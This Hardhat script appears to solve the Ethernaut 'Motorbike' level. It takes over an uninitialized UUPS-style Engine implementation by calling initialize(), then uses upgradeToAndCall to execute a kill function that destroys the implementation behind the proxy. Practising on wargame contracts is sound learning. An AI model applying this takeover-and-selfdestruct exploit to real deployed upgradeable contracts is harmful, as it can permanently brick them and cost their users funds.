
const hre = require("hardhat");

async function main() {

    const [deployer, signer0, signer1, deployer1] = await hre.ethers.getSigners();

    // const engine = await hre.ethers.deployContract("Engine", signer0);
    // const motorbike = await hre.ethers.deployContract("Motorbike", [engine.address], signer0);

    // const contract = await hre.ethers.getContractAt("Engine", motorbike.address, deployer);

    // console.log('Engine contract upgrader:', await engine.upgrader());
    // await engine.initialize();
    // console.log('Engine contract upgrader:', await engine.upgrader());

    // const testContract = await hre.ethers.deployContract('TestMotorbike', deployer);

    // let ABI = [ "function kill(address to)" ];
    // let iface = new ethers.utils.Interface(ABI);
    // const data = iface.encodeFunctionData("kill", [ deployer.address ])
    // console.log(data);

    // await engine.upgradeToAndCall(testContract.address, data);

    // console.log("Success")

    // console.log('Motorbike contract upgrader:', await contract.upgrader());

    const implementation_slot = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc';
    const motorbikeAddress = '0xFc344bd5c8631BEE4D9f9253d0805727Aa2c4c0F';
    const motorbike = await hre.ethers.getContractAt("Motorbike", motorbikeAddress, deployer);

    // const engineAddress = '0x' + (await hre.ethers.provider.getStorageAt(motorbike.address, implementation_slot)).slice(-40);
    const engineAddress = "0xfe18c9a4d514c9e3cfbe258217f1d883b3fcd20b";
    const engine = await hre.ethers.getContractAt("Engine", engineAddress, deployer);

    const contract = await hre.ethers.getContractAt("Engine", motorbikeAddress, deployer);
    console.log('Motorbike contract upgrader:', await contract.upgrader());

    console.log('Engine contract upgrader:', await engine.upgrader());
    await engine.initialize();
    console.log('Engine contract upgrader:', await engine.upgrader());

    const testContract = await hre.ethers.deployContract('TestMotorbike', deployer);

    let ABI = [ "function kill(address to)" ];
    let iface = new ethers.utils.Interface(ABI);
    const data = iface.encodeFunctionData("kill", [ deployer.address ])
    console.log(data);

    await engine.upgradeToAndCall(testContract.address, data);

    console.log("Success")

    console.log('Motorbike contract upgrader:', await contract.upgrader());



}


main()
